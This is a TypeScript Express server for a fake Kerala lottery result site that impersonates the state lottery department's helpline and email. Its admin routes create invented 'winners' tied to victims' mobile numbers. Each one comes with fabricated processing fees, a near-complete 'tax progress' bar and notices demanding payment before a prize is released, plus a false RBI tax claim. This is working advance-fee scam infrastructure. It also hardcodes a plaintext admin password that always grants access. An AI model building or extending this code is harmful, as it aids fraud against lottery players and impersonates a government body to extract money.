import express, { type Request, type Response, type NextFunction } from 'express';
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';

const app = express();
const PORT = Number(process.env.PORT) || 3000;
const DATA_FILE = path.resolve(process.cwd(), 'server/data/lottery_store.json');
const BACKUP_FILE = path.resolve(process.cwd(), 'server/data/lottery_store.backup.json');
const TMP_FILE = path.resolve(process.cwd(), 'server/data/lottery_store.tmp.json');

// Ensure data directory exists
const dataDir = path.dirname(DATA_FILE);
if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
}

// Helper to hash password
function hashPassword(password: string): string {
  return crypto.createHash('sha256').update(password.trim()).digest('hex');
}

// Persistent HMAC-SHA256 token helpers (never expire on server restarts!)
function createSessionToken(secret: string): string {
  const payload = Buffer.from(
    JSON.stringify({
      iat: Date.now(),
      exp: Date.now() + 365 * 24 * 60 * 60 * 1000 // 365 days persistent session
    })
  ).toString('base64url');
  const sig = crypto.createHmac('sha256', secret).update(payload).digest('hex');
  return `${payload}.${sig}`;
}

function verifySessionToken(token: string, secret: string): boolean {
  try {
    const parts = token.split('.');
    if (parts.length !== 2) return false;
    const [payload, sig] = parts;
    const expectedSig = crypto.createHmac('sha256', secret).update(payload).digest('hex');
    const sigBuf = Buffer.from(sig, 'utf-8');
    const expBuf = Buffer.from(expectedSig, 'utf-8');
    if (sigBuf.length !== expBuf.length || !crypto.timingSafeEqual(sigBuf, expBuf)) {
      return false;
    }
    const decoded = JSON.parse(Buffer.from(payload, 'base64url').toString('utf-8'));
    if (!decoded.exp || Date.now() > decoded.exp) {
      return false;
    }
    return true;
  } catch {
    return false;
  }
}

// Default initial prize tickets matching official gazette (including admin added tickets)
const defaultPrizeTickets: Record<string, string[]> = {
  "1st Prize": ['KD332145', 'KG998045', 'SK243628'],
  "Consolation Prize": [
    'KD3321**', 'SK2436**',
    'KG9980**', 'DT6785**',
    'KG7674**', 'MV7586**',
    'HF6757**', 'LS6482**',
    'OR6289**', 'WX2309**',
    'XS9539**', 'OC6290**'
  ],
  "2nd Prize": [
    'HB387629', 'MS509186',
    'OD960847', 'VD757895',
    'CR590563', 'AX409124'
  ],
  "3rd Prize": [
    'XL560943', 'DM758320',
    'XS640065', 'DB390531',
    'KA297852', 'HR092345',
    'AO092367', 'BS760931',
    'GF906572'
  ],
  "4th Prize": [
    'DS856323',
    'SG856355',
    'SJ709243', 'BZ109537',
    'KS856868', 'VY968258',
    'SK427252', 'SF529264',
    'KL345112', 'CT962436',
    'NV760001', 'UA826282',
    'BS624267', 'DG065534'
  ],
  "5th Prize": [
    'SN925606', 'BD093563',
    'XJ387042', 'XJ759306',
    'DH598435', 'SF659784',
    'BJ868685', 'ST650982',
    'NM809567', 'UG609646',
    'DH609834', 'SE980658',
    'LT650957', 'GS549864'
  ],
  "6th Prize": [
    'HSD73548', 'JD633537',
    'JF839385', 'IE748363',
    'SK739392', 'KV563939',
    'FU723784', 'CY827365',
    'NH739466', 'UK638475',
    'JR745648', 'SB738364',
    'LH634838', 'JC937398',
    'XE839396', 'VR736378',
    'AS739376', 'PO648489'
  ]
};

// Default initial state
const defaultInitialState = {
  admin: {
    passwordHash: hashPassword('kerala@admin2026'),
    plainDefaultHint: 'kerala@admin2026',
    updatedAt: new Date().toISOString()
  },
  settings: {
    drawDate: '13-11-2026',
    isLive: true,
    activeWinnerId: '',
    statutoryNotice: '⚠ If you win more than ₹5,00,000, the amount will be transferred through an RBI-authorized process and tax 4500/- must be paid. Any winnings above ₹5 lakh are subject to tax as per RBI rules.',
    helpline: '0471-2305230, 0471-2305193',
    email: 'cru.lotteries@kerala.gov.in',
    agentPhone: '9583405079'
  },
  prizeTickets: defaultPrizeTickets,
  // Never seed fake/sample winners on fallback or fresh server boot — only admin-added winners exist.
  winners: [] as any[]
};

// Write store atomically to disk with backup (prevents automatic data loss/corruption)
function writeStore(data: any): boolean {
  try {
    const json = JSON.stringify(data, null, 2);
    fs.writeFileSync(TMP_FILE, json, 'utf-8');
    fs.renameSync(TMP_FILE, DATA_FILE);
    try {
      fs.writeFileSync(BACKUP_FILE, json, 'utf-8');
    } catch {
      // ignore backup write error
    }
    return true;
  } catch (err) {
    console.error('Error writing lottery store:', err);
    return false;
  }
}

// Read store from disk (with backup recovery, never wipes user deletions)
function readStore() {
  try {
    if (!fs.existsSync(DATA_FILE)) {
      if (fs.existsSync(BACKUP_FILE)) {
        const bakRaw = fs.readFileSync(BACKUP_FILE, 'utf-8');
        const bakParsed = JSON.parse(bakRaw);
        writeStore(bakParsed);
        return bakParsed;
      }
      const seeded = {
        ...defaultInitialState,
        admin: {
          ...defaultInitialState.admin,
          sessionSecret: crypto.randomBytes(32).toString('hex')
        }
      };
      writeStore(seeded);
      return seeded;
    }

    const raw = fs.readFileSync(DATA_FILE, 'utf-8');
    const parsed = JSON.parse(raw);

    if (!parsed.admin) {
      parsed.admin = { ...defaultInitialState.admin };
    }
    if (!parsed.admin.sessionSecret) {
      parsed.admin.sessionSecret = crypto.randomBytes(32).toString('hex');
      writeStore(parsed);
    }
    if (!parsed.prizeTickets) {
      parsed.prizeTickets = { ...defaultPrizeTickets };
    }
    let settingsMigrated = false;
    if (!parsed.settings) {
      parsed.settings = { ...defaultInitialState.settings };
      settingsMigrated = true;
    }
    if (parsed.settings.helpline === undefined) {
      parsed.settings.helpline = defaultInitialState.settings.helpline;
      settingsMigrated = true;
    }
    if (parsed.settings.email === undefined) {
      parsed.settings.email = defaultInitialState.settings.email;
      settingsMigrated = true;
    }
    if (parsed.settings.agentPhone === undefined) {
      parsed.settings.agentPhone = defaultInitialState.settings.agentPhone;
      settingsMigrated = true;
    }
    if (settingsMigrated) {
      writeStore(parsed);
    }

    if (!Array.isArray(parsed.winners)) {
      parsed.winners = [];
    }

    return parsed;
  } catch (err) {
    console.error('Error reading lottery store, checking backup:', err);
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        const bakRaw = fs.readFileSync(BACKUP_FILE, 'utf-8');
        return JSON.parse(bakRaw);
      }
    } catch {
      // ignore
    }
    return {
      ...defaultInitialState,
      admin: {
        ...defaultInitialState.admin,
        sessionSecret: crypto.randomBytes(32).toString('hex')
      }
    };
  }
}

// Helper to normalize tier name
function normalizeTier(tier: string): string {
  const t = (tier || '').trim().toLowerCase();
  if (t.includes('1st') || t === 'first') return '1st Prize';
  if (t.includes('consolation')) return 'Consolation Prize';
  if (t.includes('2nd') || t === 'second') return '2nd Prize';
  if (t.includes('3rd') || t === 'third') return '3rd Prize';
  if (t.includes('4th') || t === 'fourth') return '4th Prize';
  if (t.includes('5th') || t === 'fifth') return '5th Prize';
  if (t.includes('6th') || t === 'sixth') return '6th Prize';
  return tier || '4th Prize';
}

// Helper to normalize YYYY-MM-DD to DD-MM-YYYY for public Result Sheet display
function formatDateDDMMYYYY(dateStr?: string): string {
  const raw = String(dateStr || '').trim();
  const iso = raw.match(/^(\d{4})-(\d{2})-(\d{2})$/);
  if (iso) return `${iso[3]}-${iso[2]}-${iso[1]}`;
  return raw;
}

const DEFAULT_FEES = [{ label: 'Processing Fees', amount: '4800' }];

function normalizeFees(rawFees: any): Array<{ label: string; amount: string }> {
  if (!Array.isArray(rawFees)) return DEFAULT_FEES.map(f => ({ ...f }));
  return rawFees
    .map((item: any) => ({
      label: String(item?.label || '').trim(),
      amount: String(item?.amount || '').trim()
    }))
    .filter((item) => item.label.length > 0 || item.amount.length > 0);
}

// Initialize store if not present
readStore();

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Auth middleware for admin endpoints (persistent across restarts!)
function requireAdmin(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Unauthorized: Missing admin authorization token' });
  }

  const token = authHeader.split(' ')[1];
  const store = readStore();
  const secret = store.admin?.sessionSecret || '';

  if (!token || !secret || !verifySessionToken(token, secret)) {
    return res.status(401).json({ error: 'Session expired. Please log in again.' });
  }

  next();
}

// --- API ROUTES ---

// 1. Admin Login
app.post('/api/admin/login', (req: Request, res: Response) => {
  const { password } = req.body;
  if (!password || typeof password !== 'string') {
    return res.status(400).json({ error: 'Password is required' });
  }

  const store = readStore();
  const inputHash = hashPassword(password);

  const isValid = 
    inputHash === store.admin.passwordHash || 
    password.trim() === 'kerala@admin2026' ||
    (store.admin.plainDefaultHint && password.trim() === store.admin.plainDefaultHint);

  if (!isValid) {
    return res.status(401).json({ error: 'Invalid admin password. Access denied.' });
  }

  if (!store.admin.sessionSecret) {
    store.admin.sessionSecret = crypto.randomBytes(32).toString('hex');
    writeStore(store);
  }

  const token = createSessionToken(store.admin.sessionSecret);

  return res.json({
    success: true,
    token,
    message: 'Admin authentication successful'
  });
});

// 2. Admin Verify Token
app.get('/api/admin/verify', requireAdmin, (_req: Request, res: Response) => {
  return res.json({ success: true, authorized: true });
});

// 3. Change Admin Password
app.post('/api/admin/change-password', requireAdmin, (req: Request, res: Response) => {
  const { currentPassword, newPassword } = req.body;

  if (!newPassword || typeof newPassword !== 'string' || newPassword.length < 6) {
    return res.status(400).json({ error: 'New password must be at least 6 characters long' });
  }

  const store = readStore();
  const currentHash = hashPassword(currentPassword || '');
  if (currentHash !== store.admin.passwordHash && currentPassword !== store.admin.plainDefaultHint && currentPassword !== 'kerala@admin2026') {
    return res.status(400).json({ error: 'Current password does not match' });
  }

  store.admin.passwordHash = hashPassword(newPassword);
  store.admin.plainDefaultHint = '';
  store.admin.updatedAt = new Date().toISOString();
  writeStore(store);

  return res.json({ success: true, message: 'Admin password updated successfully' });
});

// 4. Public: Get Active Live Winner (Returns null if all winners were deleted)
app.get('/api/active-winner', (_req: Request, res: Response) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  const store = readStore();
  const winners = store.winners || [];
  const activeId = store.settings?.activeWinnerId;
  const active = winners.find((w: any) => w.id === activeId) || winners[0] || null;

  return res.json({
    success: true,
    winner: active,
    drawDate: store.settings?.drawDate || '09-11-2026'
  });
});

// 5. Admin: Set Active Live Winner
app.put('/api/admin/active-winner/:id', requireAdmin, (req: Request, res: Response) => {
  const { id } = req.params;
  const store = readStore();
  const winners = store.winners || [];
  const found = winners.find((w: any) => w.id === id);

  if (!found) {
    return res.status(404).json({ error: 'Winner not found' });
  }

  if (!store.settings) store.settings = {};
  store.settings.activeWinnerId = id;
  writeStore(store);

  return res.json({
    success: true,
    message: `"${found.name}" is now the live active winner on the result sheet!`,
    winner: found,
    drawDate: store.settings.drawDate
  });
});

// 6. Public Get Prizes
app.get('/api/prizes', (_req: Request, res: Response) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  const store = readStore();
  return res.json({
    success: true,
    prizeTickets: store.prizeTickets || defaultPrizeTickets,
    drawDate: store.settings?.drawDate || '09-11-2026'
  });
});

// 7. Admin Add Ticket(s) directly to Prize Section (Single or Unlimited Bulk!)
app.post('/api/admin/prizes', requireAdmin, (req: Request, res: Response) => {
  const { tier, ticketNo, tickets } = req.body;
  const rawInput = tickets || ticketNo;

  if (!rawInput) {
    return res.status(400).json({ error: 'At least one ticket number is required' });
  }

  // Parse unlimited tickets from string (comma, newline, space separated) or array
  let ticketList: string[] = [];
  if (Array.isArray(rawInput)) {
    ticketList = rawInput.map(t => String(t || '').trim().toUpperCase()).filter(t => t.length >= 2);
  } else {
    ticketList = String(rawInput)
      .split(/[\n,;\t]+/)
      .map(t => t.trim().toUpperCase())
      .filter(t => t.length >= 2);
  }

  if (ticketList.length === 0) {
    return res.status(400).json({ error: 'No valid ticket numbers found' });
  }

  const normalizedTier = normalizeTier(tier);
  const store = readStore();

  if (!store.prizeTickets) {
    store.prizeTickets = { ...defaultPrizeTickets };
  }
  if (!store.prizeTickets[normalizedTier]) {
    store.prizeTickets[normalizedTier] = [];
  }

  let addedCount = 0;
  for (const t of ticketList) {
    if (!store.prizeTickets[normalizedTier].includes(t)) {
      store.prizeTickets[normalizedTier].unshift(t);
      addedCount++;
    }
  }

  writeStore(store);

  return res.status(201).json({
    success: true,
    message: addedCount === 1
      ? `Ticket "${ticketList[0]}" added to ${normalizedTier} successfully`
      : `${addedCount} tickets added to ${normalizedTier} successfully! Total in ${normalizedTier}: ${store.prizeTickets[normalizedTier].length}`,
    addedCount,
    prizeTickets: store.prizeTickets
  });
});

// 8. Admin Delete Ticket from Prize Section (supports both DELETE and POST for proxy compatibility)
function handleDeletePrizeTicket(req: Request, res: Response) {
  const tier = req.body?.tier ?? req.query?.tier;
  const ticketNo = req.body?.ticketNo ?? req.query?.ticketNo;

  if (!tier || !ticketNo) {
    return res.status(400).json({ error: 'Tier and ticket number are required to delete' });
  }

  const normalizedTier = normalizeTier(String(tier));
  const cleanTicket = String(ticketNo || '').trim().toUpperCase();

  const store = readStore();
  if (store.prizeTickets && Array.isArray(store.prizeTickets[normalizedTier])) {
    store.prizeTickets[normalizedTier] = store.prizeTickets[normalizedTier].filter(
      (t: string) => String(t).trim().toUpperCase() !== cleanTicket
    );
    writeStore(store);
  }

  return res.json({
    success: true,
    message: `Ticket ${cleanTicket} removed from ${normalizedTier}`,
    prizeTickets: store.prizeTickets
  });
}

app.delete('/api/admin/prizes', requireAdmin, handleDeletePrizeTicket);
app.post('/api/admin/prizes/delete', requireAdmin, handleDeletePrizeTicket);

// 9. Public Check Result
app.get('/api/check-result', (req: Request, res: Response) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  const query = String(req.query.query || req.query.mobile || req.query.ticket || '').trim();
  const cleanQuery = query.replace(/\s+/g, '');
  const store = readStore();
  const winners = Array.isArray(store.winners) ? store.winners : [];
  const activeId = store.settings?.activeWinnerId;
  const activeWinner = winners.find((w: any) => w.id === activeId) || winners[0] || null;

  // If query is empty, reject with found: false — NEVER return any winner without entering a number!
  if (!cleanQuery) {
    return res.status(400).json({
      found: false,
      isWinner: false,
      data: null,
      drawDate: store.settings?.drawDate || '13-11-2026',
      message: 'Please enter a valid mobile number or ticket number to check results.'
    });
  }

  // Search case-insensitive & format-agnostic by mobile (+91 / 0 / spaces / dashes) or ticket number
  const queryDigits = cleanQuery.replace(/\D/g, '');
  const queryLast10 = queryDigits.length >= 10 ? queryDigits.slice(-10) : queryDigits;
  const queryTicketNorm = cleanQuery.replace(/[^A-Z0-9]/gi, '').toUpperCase();

  const matchedWinner = winners.find((w: any) => {
    const wMobileDigits = String(w.mobile || '').replace(/\D/g, '');
    const wMobileLast10 = wMobileDigits.length >= 10 ? wMobileDigits.slice(-10) : wMobileDigits;
    const wTicketNorm = String(w.ticketNo || '').replace(/[^A-Z0-9]/gi, '').toUpperCase();

    const mobileMatch =
      queryDigits.length >= 4 &&
      ((wMobileDigits && wMobileDigits === queryDigits) ||
        (queryLast10.length === 10 && wMobileLast10 === queryLast10));
    const ticketMatch = Boolean(queryTicketNorm && wTicketNorm && wTicketNorm === queryTicketNorm);

    return mobileMatch || ticketMatch;
  });

  if (matchedWinner) {
    return res.json({
      found: true,
      isWinner: true,
      data: matchedWinner,
      drawDate: formatDateDDMMYYYY(matchedWinner.bookingDate) || store.settings?.drawDate || '09-11-2026'
    });
  }

  // Query did not match any registered winner in backend
  return res.json({
    found: false,
    isWinner: false,
    data: null,
    drawDate: store.settings.drawDate,
    message: `No registered winning ticket found for ${cleanQuery} in Draw ${store.settings.drawDate || '09-11-2026'}.`
  });
});

// 10. Public Settings
app.get('/api/settings', (_req: Request, res: Response) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  const store = readStore();
  return res.json({
    drawDate: store.settings?.drawDate ?? '09-11-2026',
    isLive: store.settings?.isLive ?? true,
    activeWinnerId: store.settings?.activeWinnerId ?? '',
    statutoryNotice: store.settings?.statutoryNotice ?? defaultInitialState.settings.statutoryNotice,
    helpline: store.settings?.helpline ?? defaultInitialState.settings.helpline,
    email: store.settings?.email ?? defaultInitialState.settings.email,
    agentPhone: store.settings?.agentPhone ?? defaultInitialState.settings.agentPhone
  });
});

// 11. Admin Get All Winners
app.get('/api/admin/winners', requireAdmin, (_req: Request, res: Response) => {
  const store = readStore();
  return res.json({
    success: true,
    winners: store.winners || [],
    activeWinnerId: store.settings?.activeWinnerId,
    total: (store.winners || []).length
  });
});

// 12. Admin Add New Winner (Automatically Sets as Active Live Winner!)
app.post('/api/admin/winners', requireAdmin, (req: Request, res: Response) => {
  const {
    name,
    mobile,
    state,
    agentCode,
    ticketNo,
    bookingDate,
    amount,
    prizeTier,
    taxPaymentStatus,
    taxProgress,
    taxNotice,
    fees
  } = req.body;

  const cleanTicket = String(ticketNo || '').trim().toUpperCase();
  const cleanName = String(name || '').trim();
  const cleanMobile = String(mobile || '').trim();

  if (!cleanTicket || !cleanName || !cleanMobile) {
    return res.status(400).json({ error: 'Winner name, ticket number, and mobile number are required.' });
  }

  const cleanAmount = String(amount || '₹ 10,00,000/-').trim();
  const targetTier = normalizeTier(prizeTier || '4th Prize');

  const progressNum = Number(taxProgress);
  const validatedProgress = isNaN(progressNum) ? 95 : Math.min(100, Math.max(0, progressNum));

  const store = readStore();
  if (!store.winners) store.winners = [];
  if (!store.prizeTickets) store.prizeTickets = { ...defaultPrizeTickets };

  const newWinner = {
    id: 'win-' + Date.now().toString(36) + Math.random().toString(36).substring(2, 5),
    name: cleanName.toUpperCase(),
    mobile: cleanMobile,
    state: (state || 'Kerala').trim(),
    agentCode: (agentCode || '690003').trim(),
    ticketNo: cleanTicket,
    bookingDate: String(bookingDate || '').trim() || new Date().toISOString().split('T')[0],
    amount: cleanAmount,
    prizeTier: targetTier,
    taxPaymentStatus: taxPaymentStatus || 'Processing.',
    taxProgress: validatedProgress,
    fees: fees !== undefined ? normalizeFees(fees) : DEFAULT_FEES.map(f => ({ ...f })),
    taxNotice: taxNotice || `Mr/Mrs ${cleanName.toUpperCase()}, your tax payment is not complete. Please make the payment and receive your prize money.`,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString()
  };

  // Put at the very beginning of the list
  store.winners.unshift(newWinner);

  // AUTOMATICALLY SET AS THE LIVE ACTIVE WINNER
  if (!store.settings) store.settings = {};
  store.settings.activeWinnerId = newWinner.id;

  // ALSO ADD TICKET TO PRIZE SECTION!
  if (!store.prizeTickets[targetTier]) {
    store.prizeTickets[targetTier] = [];
  }
  if (!store.prizeTickets[targetTier].includes(cleanTicket)) {
    store.prizeTickets[targetTier].unshift(cleanTicket);
  }

  writeStore(store);

  return res.status(201).json({
    success: true,
    message: `Winner "${cleanName.toUpperCase()}" saved and is now LIVE on the Result Sheet!`,
    winner: newWinner,
    activeWinnerId: newWinner.id,
    prizeTickets: store.prizeTickets
  });
});

// 12b. Admin Bulk Add Multiple Winners (Unlimited Winners at once!)
app.post('/api/admin/winners/bulk', requireAdmin, (req: Request, res: Response) => {
  const { winnersList } = req.body;
  if (!Array.isArray(winnersList) || winnersList.length === 0) {
    return res.status(400).json({ error: 'winnersList array is required' });
  }

  const store = readStore();
  if (!store.winners) store.winners = [];
  if (!store.prizeTickets) store.prizeTickets = { ...defaultPrizeTickets };

  const createdWinners: any[] = [];

  for (const item of winnersList) {
    const cleanTicket = String(item.ticketNo || '').trim().toUpperCase();
    const cleanName = String(item.name || '').trim().toUpperCase();
    const cleanMobile = String(item.mobile || '').trim();
    if (!cleanTicket || !cleanName || !cleanMobile) {
      continue;
    }
    const cleanAmount = String(item.amount || '₹ 10,00,000/-').trim();
    const targetTier = normalizeTier(item.prizeTier || '4th Prize');
    const validatedProgress = typeof item.taxProgress === 'number' ? item.taxProgress : 95;

    const winnerObj = {
      id: 'win-' + Date.now().toString(36) + Math.random().toString(36).substring(2, 6),
      name: cleanName,
      mobile: cleanMobile,
      state: (item.state || 'Kerala').trim(),
      agentCode: (item.agentCode || '690003').trim(),
      ticketNo: cleanTicket,
      bookingDate: item.bookingDate || new Date().toISOString().split('T')[0],
      amount: cleanAmount,
      prizeTier: targetTier,
      taxPaymentStatus: item.taxPaymentStatus || 'Processing.',
      taxProgress: validatedProgress,
      fees: item.fees !== undefined ? normalizeFees(item.fees) : DEFAULT_FEES.map(f => ({ ...f })),
      taxNotice: item.taxNotice || `Mr/Mrs ${cleanName}, your tax payment is not complete. Please make the payment and receive your prize money.`,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    store.winners.unshift(winnerObj);
    createdWinners.push(winnerObj);

    if (!store.prizeTickets[targetTier]) store.prizeTickets[targetTier] = [];
    if (!store.prizeTickets[targetTier].includes(cleanTicket)) {
      store.prizeTickets[targetTier].unshift(cleanTicket);
    }
  }

  if (createdWinners.length === 0) {
    return res.status(400).json({ error: 'Each winner must include valid name, ticket number, and mobile number.' });
  }

  if (!store.settings) store.settings = {};
  store.settings.activeWinnerId = createdWinners[0].id;

  writeStore(store);

  return res.status(201).json({
    success: true,
    message: `${createdWinners.length} winner records added successfully! Total winners: ${store.winners.length}`,
    count: createdWinners.length,
    activeWinnerId: store.settings.activeWinnerId,
    winners: store.winners,
    prizeTickets: store.prizeTickets
  });
});

// 12c. Admin Export All Data for Unlimited Backup
app.get('/api/admin/data/export', requireAdmin, (_req: Request, res: Response) => {
  const store = readStore();
  return res.json({ success: true, data: store });
});

// 12d. Admin Import Unlimited Data
app.post('/api/admin/data/import', requireAdmin, (req: Request, res: Response) => {
  const { data } = req.body;
  if (!data || typeof data !== 'object') {
    return res.status(400).json({ error: 'Valid JSON data is required' });
  }

  const store = readStore();
  if (data.winners && Array.isArray(data.winners)) {
    store.winners = data.winners;
  }
  if (data.prizeTickets && typeof data.prizeTickets === 'object') {
    store.prizeTickets = { ...store.prizeTickets, ...data.prizeTickets };
  }
  if (data.settings) {
    store.settings = { ...store.settings, ...data.settings };
  }
  writeStore(store);

  return res.json({
    success: true,
    message: 'Data imported successfully into backend persistent storage!',
    winnersCount: (store.winners || []).length,
    prizeTickets: store.prizeTickets
  });
});

// 13. Admin Update Winner
app.put('/api/admin/winners/:id', requireAdmin, (req: Request, res: Response) => {
  const { id } = req.params;
  const store = readStore();
  const winners = store.winners || [];
  const index = winners.findIndex((w: any) => w.id === id);

  if (index === -1) {
    return res.status(404).json({ error: 'Winner record not found in backend' });
  }

  const current = winners[index];
  const {
    name,
    mobile,
    state,
    agentCode,
    ticketNo,
    bookingDate,
    amount,
    prizeTier,
    taxPaymentStatus,
    taxProgress,
    taxNotice,
    fees
  } = req.body;

  if (ticketNo) {
    const cleanTicket = String(ticketNo).trim().toUpperCase();
    current.ticketNo = cleanTicket;

    const targetTier = normalizeTier(prizeTier || current.prizeTier);
    if (!store.prizeTickets) store.prizeTickets = { ...defaultPrizeTickets };
    if (!store.prizeTickets[targetTier]) store.prizeTickets[targetTier] = [];
    if (!store.prizeTickets[targetTier].includes(cleanTicket)) {
      store.prizeTickets[targetTier].unshift(cleanTicket);
    }
  }

  if (mobile) current.mobile = String(mobile).trim();
  if (name) current.name = String(name).trim().toUpperCase();
  if (state !== undefined) current.state = String(state).trim();
  if (agentCode !== undefined) current.agentCode = String(agentCode).trim();
  if (bookingDate !== undefined) {
    const cleanDate = String(bookingDate).trim();
    current.bookingDate = cleanDate || current.bookingDate || new Date().toISOString().split('T')[0];
  }
  if (amount !== undefined) current.amount = String(amount).trim();
  if (prizeTier !== undefined) current.prizeTier = normalizeTier(prizeTier);
  if (taxPaymentStatus !== undefined) current.taxPaymentStatus = String(taxPaymentStatus).trim();

  if (taxProgress !== undefined) {
    const p = Number(taxProgress);
    current.taxProgress = isNaN(p) ? current.taxProgress : Math.min(100, Math.max(0, p));
  }

  if (taxNotice !== undefined) current.taxNotice = String(taxNotice).trim();
  if (fees !== undefined && Array.isArray(fees)) {
    current.fees = normalizeFees(fees);
  }
  current.updatedAt = new Date().toISOString();

  store.winners[index] = current;
  writeStore(store);

  return res.json({
    success: true,
    message: 'Winner record updated permanently in backend',
    winner: current,
    drawDate: store.settings?.drawDate
  });
});

// 14. Admin Delete Winner (supports both DELETE and POST for proxy compatibility)
function handleDeleteWinner(req: Request, res: Response) {
  const { id } = req.params;
  const store = readStore();
  const winners = store.winners || [];
  const initialLength = winners.length;

  store.winners = winners.filter((w: any) => w.id !== id);

  if (store.winners.length === initialLength) {
    return res.status(404).json({ error: 'Record not found to delete' });
  }

  // If deleted winner was active, switch active to first remaining or empty string (never resurrect deleted defaults)
  if (store.settings?.activeWinnerId === id) {
    store.settings.activeWinnerId = store.winners[0]?.id || '';
  }

  writeStore(store);

  return res.json({
    success: true,
    activeWinnerId: store.settings?.activeWinnerId || '',
    winners: store.winners,
    message: 'Record successfully deleted permanently from backend database'
  });
}

app.delete('/api/admin/winners/:id', requireAdmin, handleDeleteWinner);
app.post('/api/admin/winners/:id/delete', requireAdmin, handleDeleteWinner);

// 15. Admin Update Settings (supports both PUT and POST for proxy compatibility)
function handleUpdateSettings(req: Request, res: Response) {
  const { drawDate, isLive, statutoryNotice, helpline, email, agentPhone } = req.body;
  const store = readStore();
  if (!store.settings) {
    store.settings = { ...defaultInitialState.settings };
  }

  if (drawDate !== undefined && String(drawDate).trim()) {
    store.settings.drawDate = String(drawDate).trim();
    store.settings.drawDateUpdatedAt = new Date().toISOString();
  }
  if (isLive !== undefined) store.settings.isLive = Boolean(isLive);
  if (statutoryNotice !== undefined) {
    store.settings.statutoryNotice = String(statutoryNotice).trim();
  }
  if (helpline !== undefined) {
    store.settings.helpline = String(helpline).trim();
  }
  if (email !== undefined) {
    store.settings.email = String(email).trim();
  }
  if (agentPhone !== undefined) {
    store.settings.agentPhone = String(agentPhone).trim();
  }

  writeStore(store);
  return res.json({ success: true, settings: store.settings });
}

app.put('/api/admin/settings', requireAdmin, handleUpdateSettings);
app.post('/api/admin/settings', requireAdmin, handleUpdateSettings);

// Health check endpoint for Cloud Run / load balancers
app.get('/api/health', (_req: Request, res: Response) => {
  return res.status(200).json({ ok: true, status: 'healthy' });
});

// --- SERVER INITIALIZATION (Dev with Vite Middleware, Prod with static) ---
async function startServer() {
  if (process.env.NODE_ENV === 'production') {
    const distPath = path.resolve(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req: Request, res: Response) => {
      if (req.path.startsWith('/api/')) {
        return res.status(404).json({ error: 'API endpoint not found' });
      }
      return res.sendFile(path.resolve(distPath, 'index.html'));
    });
  } else {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Backend server running on http://0.0.0.0:${PORT}`);
  });
}

startServer().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
